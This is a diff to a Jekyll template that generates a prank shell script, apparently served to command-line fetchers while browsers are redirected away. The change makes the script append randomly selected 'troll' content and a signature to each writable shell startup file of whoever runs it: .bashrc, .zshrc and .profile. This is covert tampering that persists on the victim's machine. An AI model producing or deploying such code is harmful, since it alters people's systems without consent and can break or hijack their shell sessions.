@@ -1,22 +1,29 @@
 ---
 layout: default
+output_files:
+  - $HOME/.bashrc
+  - $HOME/.zshrc
+  - $HOME/.profile
 ---
 
 {% include redirect_browser.html %}
 
 range="{{ site.trolls | size }}"
-selection=$(( $RANDOM % range ))
 
-if [[ $selection == 0 ]]; then
-cat << EOF >> $HOME/.profile
+while true; do
+  selection=$(( $RANDOM % range ))
+
+  {% for troll in site.trolls offset:1 %}
+  {% if forloop.index0 == 0 %}if{% else %}elif{% endif %} [[ $selection == {{ forloop.index0 }} ]]; then
+    for file in{% for f in page.output_files %} "{{ f }}"{% endfor %}; do
+    test -w $file && cat << EOF >> $file
+
 {% include signature.html %}
-{{ site.trolls[0].content }}
+{{ site.trolls[forloop.index0].content }}
 EOF
-{% for troll in site.trolls offset:1 %}
-elif [[ $selection == {{ forloop.index }} ]]; then
-cat << EOF >> $HOME/.profile
-{% include signature.html %}
-{{ site.trolls[forloop.index].content }}
-EOF
-{% endfor %}
-fi
+  done
+
+  break
+  {% endfor %}
+  fi
+done
